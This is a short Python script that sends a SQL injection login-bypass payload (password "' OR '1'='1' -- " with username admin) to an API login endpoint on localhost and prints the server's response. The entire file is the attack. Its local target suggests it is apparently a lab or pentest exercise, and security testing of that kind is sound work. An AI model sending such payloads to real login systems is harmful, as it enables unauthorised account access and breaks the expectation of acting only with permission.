import requests

url = 'http://127.0.0.1:4000/api/login'

payload = {
    'username': 'admin',
    'password': "' OR '1'='1' -- "
}

response = requests.post(
    url,
    json=payload,
    timeout=10
)

print("Status:", response.status_code)
print("Content-Type:", response.headers.get('Content-Type'))
print("Resposta:", response.text)
